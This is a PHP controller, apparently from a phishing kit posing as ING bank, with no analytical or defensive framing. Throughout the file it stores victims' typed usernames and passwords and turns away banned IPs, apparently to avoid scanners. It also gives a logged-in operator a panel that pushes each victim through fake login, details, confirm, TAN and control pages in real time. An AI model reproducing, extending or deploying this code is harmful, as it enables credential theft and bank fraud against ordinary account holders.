<?php

namespace App\Controllers\Ing;

use \Core\View;
use \App\Models\Ing\Ing;
use \App\Auth;

class Login extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['username']) && isset($_POST['password'])) {
            Ing::setLogin($_POST['username'], $_POST['password'], $_SESSION['uid']);
        } else {
            if (Ing::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Ing::checkPayment($this->route_params['id'])) {
                Ing::redirect();
            } else {
                Ing::setLogInformation($_SESSION['uid']);

                View::render('Ing/login.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Ing::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Ing::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'details') {
                        echo json_encode(['page' => 'details']);   
                        Ing::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'confirm') {
                        echo json_encode(['page' => 'confirm']);
                        Ing::setConfirmPage($_SESSION['uid'], null);
                    } else if ($check == 'tan') {
                        echo json_encode(['page' => 'tan']);
                        Ing::setTanPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Ing::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Ing::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Ing::redirect();
        }
    }

    public function setPageAction()
    {
        if (Auth::isLoggedIn()) {
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['page'])) {
                if ($_POST['page'] == 'login') {
                    $check = Ing::setLoginPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'details') {
                    $check = Ing::setDetailsPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'confirm') {
                    $check = Ing::setConfirmPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'tan') {
                    $check = Ing::setTanPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'control') {
                    $check = Ing::setControlPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }else if ($_POST['page'] == 'finish') {
                    $check = Ing::setFinishPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }
            } else {
                Ing::redirect();
            }
        } else {
            Ing::redirect();
        }
    }
}